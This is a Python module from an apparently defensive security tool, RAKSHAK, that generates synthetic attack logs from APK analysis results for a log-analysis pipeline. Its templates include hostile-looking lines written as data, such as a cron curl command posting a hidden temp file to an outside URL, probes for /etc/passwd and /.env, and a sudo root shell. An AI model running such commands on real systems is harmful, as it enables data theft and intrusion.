"""
RAKSHAK v4 — APK Log Generator
Converts APK static analysis findings → realistic system/network logs
Enables: "upload APK → get generated logs → feed to log analysis pipeline"
This bridges APK analysis and log intelligence — the key new feature Sri requested.
"""

import random
import uuid
from datetime import datetime, timezone, timedelta
from typing import Optional


# ── Realistic log templates per threat type ───────────────────────────────────

SSH_BRUTE_TEMPLATES = [
    "Jan 15 {H}:{M}:{S} server sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2",
    "Jan 15 {H}:{M}:{S} server sshd[{pid}]: Invalid user {user} from {ip} port {port}",
    "Jan 15 {H}:{M}:{S} server sshd[{pid}]: error: maximum authentication attempts exceeded for {user} from {ip} port {port} ssh2 [preauth]",
    "Jan 15 {H}:{M}:{S} server pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}",
]

C2_BEACON_TEMPLATES = [
    'Jan 15 {H}:{M}:{S} server httpd: {ip} - - [15/Jan/2026:{H}:{M}:{S} +0000] "POST /api/v2/update HTTP/1.1" 200 {size}',
    'Jan 15 {H}:{M}:{S} server httpd: {ip} - - [15/Jan/2026:{H}:{M}:{S} +0000] "GET /ping HTTP/1.1" 200 4',
    "Jan 15 {H}:{M}:{S} server named: DNS QUERY {domain} {type} from {ip}",
    "Jan 15 {H}:{M}:{S} server kernel: OUT=eth0 IN= DST={c2_ip} SRC={local_ip} PROTO=TCP DPT=443",
]

DATA_EXFIL_TEMPLATES = [
    'Jan 15 {H}:{M}:{S} server httpd: {ip} - - [15/Jan/2026:{H}:{M}:{S} +0000] "POST /upload HTTP/1.1" 200 {size}',
    "Jan 15 {H}:{M}:{S} server kernel: OUT=eth0 SRC={local_ip} DST={exfil_ip} PROTO=TCP DPT=21 LEN={size}",
    "Jan 15 {H}:{M}:{S} server sshd[{pid}]: Accepted publickey for {user} from {ip} port {port} ssh2",
    "Jan 15 {H}:{M}:{S} server cron[{pid}]: ({user}) CMD (curl -s -X POST {url} -d @/tmp/.data{rand})",
]

PERSISTENCE_TEMPLATES = [
    "Jan 15 {H}:{M}:{S} server cron[{pid}]: ({user}) RELOAD (/var/spool/cron/crontabs/{user})",
    "Jan 15 {H}:{M}:{S} server systemd[1]: Created symlink /etc/systemd/system/{service}.service",
    "Jan 15 {H}:{M}:{S} server kernel: {pid} comm=\"{binary}\" exe=\"/tmp/{binary}\" sig=0",
    "Jan 15 {H}:{M}:{S} server audit[{pid}]: type=SYSCALL msg=audit({ts}): arch=c000003e syscall=59 success=yes exe=\"/tmp/.{hidden}\"",
]

PRIVILEGE_ESC_TEMPLATES = [
    "Jan 15 {H}:{M}:{S} server sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
    "Jan 15 {H}:{M}:{S} server su[{pid}]: Successful su for root by {user}",
    "Jan 15 {H}:{M}:{S} server pam_unix(su:auth): authentication failure; logname={user} uid=1000",
    "Jan 15 {H}:{M}:{S} server kernel: {pid} comm=\"{binary}\" capability 21 target uid=0",
]

LOG_DELETION_TEMPLATES = [
    "Jan 15 {H}:{M}:{S} server audit[{pid}]: type=PATH msg=audit({ts}): item=0 name=\"/var/log/auth.log\" inode={inode} nametype=DELETE",
    "Jan 15 {H}:{M}:{S} server audit[{pid}]: type=SYSCALL msg=audit({ts}): arch=c000003e syscall=87 success=yes exe=\"/bin/rm\" key=\"log_deletion\"",
    "Jan 15 {H}:{M}:{S} server syslog: Log rotation forced by PID {pid}",
]

RECON_TEMPLATES = [
    "Jan 15 {H}:{M}:{S} server kernel: DROP IN=eth0 OUT= SRC={ip} DST={local_ip} PROTO=TCP DPT={port}",
    "Jan 15 {H}:{M}:{S} server sshd[{pid}]: Connection from {ip} port {sport} on {local_ip} port 22",
    'Jan 15 {H}:{M}:{S} server httpd: {ip} - - [15/Jan/2026:{H}:{M}:{S} +0000] "GET /.env HTTP/1.1" 404 0',
    'Jan 15 {H}:{M}:{S} server httpd: {ip} - - [15/Jan/2026:{H}:{M}:{S} +0000] "GET /wp-admin/ HTTP/1.1" 403 0',
    'Jan 15 {H}:{M}:{S} server httpd: {ip} - - [15/Jan/2026:{H}:{M}:{S} +0000] "GET /etc/passwd HTTP/1.1" 404 0',
]

MOBILE_EXFIL_TEMPLATES = [
    "Jan 15 {H}:{M}:{S} gateway httpd: {device_ip} - - POST /api/collect HTTP/1.1 200 {size} sms_data={sms_count}",
    "Jan 15 {H}:{M}:{S} gateway httpd: {device_ip} - - POST /beacon HTTP/1.1 200 48 device_id={device_id}",
    "Jan 15 {H}:{M}:{S} gateway dns: QUERY {tracking_domain} A {device_ip}",
    "Jan 15 {H}:{M}:{S} gateway firewall: ALLOW OUT {device_ip}:{sport} → {c2}:443 TCP 5242880 bytes",
]


def _ts(base_time: datetime, offset_seconds: int) -> tuple:
    """Return (H, M, S) string for log timestamp."""
    t = base_time + timedelta(seconds=offset_seconds)
    return f"{t.hour:02d}", f"{t.minute:02d}", f"{t.second:02d}"

def _rand_ip(suspicious: bool = False) -> str:
    if suspicious:
        pools = ["185.220.101.", "185.220.102.", "103.45.67.", "45.33.32.", "194.165."]
        prefix = random.choice(pools)
        return prefix + str(random.randint(1, 254))
    return f"192.168.1.{random.randint(50,200)}"

def _rand_pid() -> str:
    return str(random.randint(1000, 60000))

def _rand_port() -> str:
    return str(random.randint(40000, 65535))

def _rand_user() -> list:
    return random.choice(["root","admin","drdo_user","analyst","ubuntu","user","oracle","postgres"])

def _rand_domain(malicious: bool = True) -> str:
    if malicious:
        domains = ["update.sys-cloud.net","beacon.gov-srv.org","api.telemetry-hub.io",
                   "cdn.mobile-sync.ru","update.drdo-india.org","crm.gov-pk.org"]
        return random.choice(domains)
    return f"cdn{random.randint(1,5)}.legit-cdn.com"


class APKLogGenerator:
    """
    Converts APK analysis results into realistic DRDO/enterprise log streams.
    Each threat indicator in the APK maps to corresponding log signatures.
    """

    def generate(self, apk_analysis: dict, log_duration_minutes: int = 60) -> dict:
        """
        Main entry point.
        apk_analysis: result dict from RAKSHAK APK pipeline
        Returns: {"log_text": str, "log_summary": dict, "threat_mapping": list}
        """
        base_time   = datetime(2026, 1, 15, 10, 0, 0)
        log_lines   = []
        threat_map  = []
        offset      = 0

        # Extract key indicators from APK analysis
        permissions = self._get_permissions(apk_analysis)
        iocs        = self._get_iocs(apk_analysis)
        risk_score  = apk_analysis.get("risk_score", {}).get("final_score", 50) if isinstance(apk_analysis.get("risk_score"), dict) else apk_analysis.get("risk_score", 50)
        apt_detected = apk_analysis.get("yara_analysis", {}).get("apt_detected", False)
        malware_families = apk_analysis.get("yara_analysis", {}).get("malware_families", [])

        # ── 1. Initial Recon Phase ─────────────────────────────────────────────
        attacker_ip = _rand_ip(suspicious=True)
        for i in range(random.randint(5, 15)):
            H, M, S = _ts(base_time, offset + i * 30)
            template = random.choice(RECON_TEMPLATES)
            log_lines.append(template.format(
                H=H, M=M, S=S, ip=attacker_ip,
                local_ip="10.0.0.1", port=str(random.randint(80, 8443)),
                sport=_rand_port(), pid=_rand_pid(),
            ))
        threat_map.append({"phase": "Reconnaissance", "techniques": ["T1046","T1082"], "log_count": 15})
        offset += 600

        # ── 2. Brute Force (if READ_SMS, RECORD_AUDIO, or high risk) ──────────
        if any(p in str(permissions) for p in ["READ_SMS","RECORD_AUDIO","READ_CONTACTS"]) or risk_score >= 60:
            for i in range(random.randint(20, 40)):
                H, M, S = _ts(base_time, offset + i * 4)
                template = random.choice(SSH_BRUTE_TEMPLATES)
                log_lines.append(template.format(
                    H=H, M=M, S=S, ip=attacker_ip, pid=_rand_pid(),
                    port=_rand_port(), user=_rand_user(),
                    ts=f"{base_time.timestamp():.3f}"
                ))
            # One successful login after brute force
            H, M, S = _ts(base_time, offset + 200)
            log_lines.append(
                f"Jan 15 {H}:{M}:{S} server sshd[{_rand_pid()}]: "
                f"Accepted password for drdo_admin from {attacker_ip} port {_rand_port()} ssh2"
            )
            threat_map.append({"phase": "Initial Access via Brute Force", "techniques": ["T1110","T1078"], "log_count": 41})
        offset += 900

        # ── 3. C2 Beaconing (if network IOCs found or SYSTEM_ALERT_WINDOW) ────
        c2_ips = iocs.get("c2_ips", [_rand_ip(True), _rand_ip(True)])
        c2_domains = iocs.get("c2_domains", [_rand_domain(True)])
        if any(p in str(permissions) for p in ["INTERNET","SYSTEM_ALERT_WINDOW","FOREGROUND_SERVICE"]) or c2_ips:
            c2_ip = c2_ips[0] if c2_ips else _rand_ip(True)
            # Periodic beaconing — simulate regular intervals
            for i in range(random.randint(10, 20)):
                H, M, S = _ts(base_time, offset + i * 120)  # every 2 min
                template = random.choice(C2_BEACON_TEMPLATES)
                log_lines.append(template.format(
                    H=H, M=M, S=S, ip=attacker_ip,
                    size=str(random.randint(128, 4096)),
                    domain=random.choice(c2_domains) if c2_domains else _rand_domain(True),
                    type=random.choice(["A","TXT","MX"]),
                    c2_ip=c2_ip, local_ip="10.0.0.50",
                ))
            threat_map.append({"phase": "C2 Beaconing", "techniques": ["T1071","T1071.001","T1071.004"], "log_count": 20})
        offset += 1800

        # ── 4. Persistence (RECEIVE_BOOT_COMPLETED or APT detected) ──────────
        if "RECEIVE_BOOT_COMPLETED" in str(permissions) or apt_detected:
            for i in range(random.randint(3, 6)):
                H, M, S = _ts(base_time, offset + i * 30)
                template = random.choice(PERSISTENCE_TEMPLATES)
                log_lines.append(template.format(
                    H=H, M=M, S=S, pid=_rand_pid(),
                    user="drdo_admin", service=f"sys_update_{random.randint(1,99)}",
                    binary=f".{uuid.uuid4().hex[:6]}",
                    hidden=uuid.uuid4().hex[:8],
                    ts=f"{(base_time + timedelta(seconds=offset)).timestamp():.3f}"
                ))
            threat_map.append({"phase": "Persistence", "techniques": ["T1547","T1053","T1543"], "log_count": 5})
        offset += 600

        # ── 5. Privilege Escalation ────────────────────────────────────────────
        if risk_score >= 70 or apt_detected:
            for i in range(random.randint(2, 5)):
                H, M, S = _ts(base_time, offset + i * 60)
                template = random.choice(PRIVILEGE_ESC_TEMPLATES)
                log_lines.append(template.format(
                    H=H, M=M, S=S, pid=_rand_pid(),
                    user="drdo_admin", binary="exploit_"+uuid.uuid4().hex[:4]
                ))
            threat_map.append({"phase": "Privilege Escalation", "techniques": ["T1068","T1548","T1134"], "log_count": 4})
        offset += 600

        # ── 6. Data Exfiltration (SMS/CONTACTS/LOCATION = prime exfil indicators)
        exfil_perms = ["READ_SMS","READ_CONTACTS","ACCESS_FINE_LOCATION","CAMERA","RECORD_AUDIO"]
        if any(p in str(permissions) for p in exfil_perms):
            exfil_ip = c2_ips[0] if c2_ips else _rand_ip(True)
            exfil_urls = iocs.get("urls", [f"https://{_rand_domain(True)}/upload"])
            for i in range(random.randint(5, 12)):
                H, M, S = _ts(base_time, offset + i * 90)
                template = random.choice(DATA_EXFIL_TEMPLATES)
                log_lines.append(template.format(
                    H=H, M=M, S=S, ip=attacker_ip, pid=_rand_pid(),
                    user="drdo_admin", size=str(random.randint(50000, 5000000)),
                    port=_rand_port(), exfil_ip=exfil_ip,
                    local_ip="10.0.0.50",
                    url=random.choice(exfil_urls) if exfil_urls else _rand_domain(True),
                    rand=random.randint(100, 999),
                ))
            threat_map.append({"phase": "Data Exfiltration", "techniques": ["T1041","T1048","T1567"], "log_count": 10})

            # Mobile-specific logs if SMS/contacts
            if "READ_SMS" in str(permissions) or "READ_CONTACTS" in str(permissions):
                device_ip = f"192.168.1.{random.randint(100,200)}"
                for i in range(5):
                    H, M, S = _ts(base_time, offset + 200 + i * 60)
                    template = random.choice(MOBILE_EXFIL_TEMPLATES)
                    log_lines.append(template.format(
                        H=H, M=M, S=S, device_ip=device_ip,
                        size=str(random.randint(1000, 500000)),
                        sms_count=str(random.randint(50, 500)),
                        device_id=uuid.uuid4().hex[:12],
                        tracking_domain=_rand_domain(True),
                        c2=exfil_ip, sport=_rand_port(),
                    ))

        offset += 900

        # ── 7. Log Deletion / Cover Tracks ────────────────────────────────────
        if risk_score >= 80 or apt_detected or "Lazarus" in str(malware_families) or "APT" in str(malware_families):
            for i in range(random.randint(2, 4)):
                H, M, S = _ts(base_time, offset + i * 20)
                template = random.choice(LOG_DELETION_TEMPLATES)
                log_lines.append(template.format(
                    H=H, M=M, S=S, pid=_rand_pid(),
                    ts=f"{(base_time + timedelta(seconds=offset)).timestamp():.3f}",
                    inode=str(random.randint(100000, 999999))
                ))
            threat_map.append({"phase": "Defense Evasion — Log Deletion", "techniques": ["T1070","T1070.002"], "log_count": 3})

        # Sort by approximate timestamp order
        log_lines_shuffled = log_lines  # already in order by offset

        log_text = "\n".join(log_lines)

        # Build summary
        total_lines = len(log_lines)
        total_phases = len(threat_map)

        return {
            "log_text":        log_text,
            "log_filename":    f"RAKSHAK_APK_GENERATED_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
            "total_lines":     total_lines,
            "generation_time": datetime.now(timezone.utc).isoformat() + "Z",
            "source_apk":      apk_analysis.get("apk_name", "unknown.apk"),
            "attack_phases":   total_phases,
            "threat_mapping":  threat_map,
            "attacker_ip":     attacker_ip,
            "c2_ips_used":     c2_ips[:3],
            "c2_domains_used": c2_domains[:3],
            "permissions_used":list(set(p for p in permissions if any(
                k in p for k in ["SMS","CONTACT","AUDIO","CAMERA","LOCATION","BOOT"]
            )))[:10],
            "log_summary": {
                "total_log_lines":  total_lines,
                "attack_phases":    total_phases,
                "risk_score_basis": risk_score,
                "apt_simulation":   apt_detected,
                "techniques_simulated": list({t for m in threat_map for t in m["techniques"]}),
            }
        }

    def generate_manual_template(self, log_type: str = "auth") -> str:
        """Return a log template the analyst can paste into the manual log input."""
        templates = {
            "auth": """# Paste your auth.log content below:
Jan 15 10:23:01 server sshd[1234]: Failed password for root from 185.220.101.45 port 22 ssh2
Jan 15 10:23:03 server sshd[1234]: Failed password for admin from 185.220.101.45 port 22 ssh2
Jan 15 10:30:00 server sshd[1236]: Accepted password for drdo_user from 10.0.0.5 port 54321
""",
            "syslog": """# Paste your syslog content below:
Jan 15 10:35:00 server sudo: drdo_user : TTY=pts/0 ; PWD=/home/drdo_user ; USER=root ; COMMAND=/bin/bash
Jan 15 10:40:00 server kernel: DROP IN=eth0 SRC=185.220.101.45 DPT=443
""",
            "web": """# Paste your Apache/Nginx access.log content below:
185.220.101.45 - - [15/Jan/2026:11:00:00 +0000] "GET /wp-admin/ HTTP/1.1" 403 0
185.220.101.45 - - [15/Jan/2026:11:00:01 +0000] "GET /.env HTTP/1.1" 404 0
""",
        }
        return templates.get(log_type, templates["auth"])

    # ── Private helpers ───────────────────────────────────────────────────────

    def _get_permissions(self, apk_analysis: dict) -> list:
        manifest = apk_analysis.get("manifest", {})
        return manifest.get("permissions", []) + manifest.get("dangerous_permissions", [])

    def _get_iocs(self, apk_analysis: dict) -> dict:
        strings = apk_analysis.get("strings", {})
        return {
            "c2_ips":     [ip.get("ip","") for ip in strings.get("ips",[])[:5]] if strings.get("ips") else [],
            "c2_domains": [u.get("url","") for u in strings.get("urls",[])[:5]] if strings.get("urls") else [],
            "urls":       [u.get("url","") for u in strings.get("urls",[])[:10]] if strings.get("urls") else [],
        }
